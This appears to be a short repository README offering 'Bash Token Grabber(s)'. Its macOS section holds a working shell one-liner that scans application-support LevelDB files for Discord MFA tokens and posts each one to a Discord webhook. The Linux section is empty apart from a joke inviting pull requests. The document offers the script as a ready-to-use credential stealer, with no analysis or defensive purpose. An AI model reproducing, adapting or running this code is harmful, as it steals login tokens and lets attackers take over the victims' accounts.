# Bash Token Grabber(s)



### Linux

```
i don't have any linux system, if you have one, PRs are open :D
```

### MacOS

```
export WB=https://canary.discord.com/api/webhooks/.../...

for grabbed_token in $(find ~/Library/Application\ Support/* -type f -name "*.ldb" -exec strings {} \; 2>/dev/null|grep -oE "\"mfa.*\""|sed "s/\"//g" |uniq);do curl -X POST $WB --data "{\"content\": \"**Grabbed token**\n\n||$grabbed_token||\"}"-H "Accept: application/json" -H "Content-Type:application/json" >/dev/null;done; 
```